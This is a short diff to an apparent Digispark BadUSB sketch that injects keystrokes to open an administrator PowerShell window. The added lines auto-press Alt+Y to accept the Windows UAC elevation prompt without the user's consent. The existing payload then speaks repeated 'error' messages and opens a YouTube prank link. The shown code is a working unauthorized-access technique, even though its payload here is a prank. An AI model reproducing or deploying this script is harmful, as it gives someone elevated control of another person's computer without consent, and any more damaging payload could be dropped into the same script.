@@ -13,6 +13,8 @@ void loop() {
   DigiKeyboard.print("Powershell Start-Process powershell -Verb runAs");
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
   DigiKeyboard.delay(5000);
   // you can delelte error sound by deleting from "add-type" to "music.')n"
   DigiKeyboard.println(F("$put = \"Add-Type -AssemblyName System.speech\n$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer\n$speak.Speak('error, error, error, error, error, error, error, error. playing a music.')\nstart https://www.youtube.com/watch?v=oHg5SJYRHA0\nexit\""));
